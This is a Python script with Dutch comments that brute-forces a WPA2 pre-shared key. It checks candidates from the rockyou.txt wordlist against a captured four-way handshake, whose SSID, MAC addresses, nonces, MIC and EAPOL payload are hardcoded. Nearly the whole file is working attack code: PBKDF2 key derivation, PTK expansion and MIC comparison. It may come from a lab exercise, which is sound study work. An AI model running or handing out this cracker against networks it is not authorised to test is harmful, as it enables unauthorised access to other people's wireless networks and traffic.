import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5

def PRF(PMK, PK_expansion, x):
    R = b''
    for i in range(4):                                                              # 64 Bytes   (md5 -> 16 Bytes per itteratie => 4)  (sha1 -> 20 Bytes per itteratie => 3.2 => 4)
        R += hmac.new(PMK, PK_expansion + b'\x00' + x + bytes([i]), sha1).digest()  # HMAC-SHA1
    return R[:64]                                                                   # Eerste 64 Bytes, sha1 zal 80 Bytes returnen, md5 exact 64 Bytes


def MakeMIC(KCK,WPA_Type,Payload):
    MIC_X = hmac.new(KCK,Payload[0], sha1).digest()     # Payload = [b'/x01........'] | Payload[0] = b'/x01........'
    MIC_X = b2a_hex(MIC_X).decode()[:-8]                

    return MIC_X   
    

def CompareMIC(List, SSID,x, MIC,Payload):
    for PSK in List:
        PMK = pbkdf2_hmac("sha1", PSK.encode('ascii'), SSID, 4096, 32)  

        PTK = PRF(PMK, b"Pairwise key expansion", x)
        
        KCK = PTK[0:16]

        MIC_X = MakeMIC(KCK,sha1,[Payload])
        
        print(f'\nPassword:\t\t {PSK}')
        print(f'Calculated MIC:\t\t {MIC_X}')
        print(f'Captured MIC:\t\t {MIC}')

        if MIC_X == MIC:                                
            print(f'\nPassword is:\t\t{PSK}\n\n')
            break
        else:
            continue



if __name__ == "__main__":     
    with open(r"C:\Users\guell\Downloads\rockyou.txt", encoding='utf-8') as f:                          # Passwoord doc openen
        List = [password.strip() for password in f if all(ord(char) < 128 for char in password)]        # Passwoorden in een list zetten (Passwoordem met speciale characters eruit) (snelheid)
        
    # SSID = input("Ssid:\t\t\t\t").encode('utf-8')
    SSID = "Azerty".encode('ascii')

    # Frame 1 
    # AP_MAC = a2b_hex(input("Mac adress accespoint:\t\t"))
    AP_MAC = a2b_hex("c0b883d6c6f3")
    # C_MAC = a2b_hex(input("Mac adress client:\t\t"))
    CL_MAC = a2b_hex("7c76682c6399")
    #aNonce = a2b_hex(input("aNonce:\t\t\t\t"))
    aNonce = a2b_hex("d9d4f37c4270b6927f371522f41d13915f8c6914071efa5bb1630ce02dc50ef6")
    
    # Frame 2
    # sNonce = a2b_hex(input("sNonce:\t\t\t\t"))
    sNonce = a2b_hex("81dd921154f1f27ad242fe0ffcc97d92ee2a65867f12095e1af0e978c08d3f07")
    # MIC = input("MIC:\t\t\t\t")
    MIC = "9a873d74f63ebc830b9ff0f3b54c2713"
    # Payload = input("802.1X Authentication:\t\t")
    Payload = a2b_hex("0103007702010a0000000000000000000181dd921154f1f27ad242fe0ffcc97d92ee2a65867f12095e1af0e978c08d3f07000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001830160100000fac040100000fac040100000fac0200000000")
    
    x = min(AP_MAC, CL_MAC) + max(AP_MAC, CL_MAC) + min(aNonce, sNonce) + max(aNonce, sNonce)       # Deel salt (Staat hier zodat hij niet bij elk passwoord moet berekenen)
    
    CompareMIC(List, SSID,x, MIC, Payload)

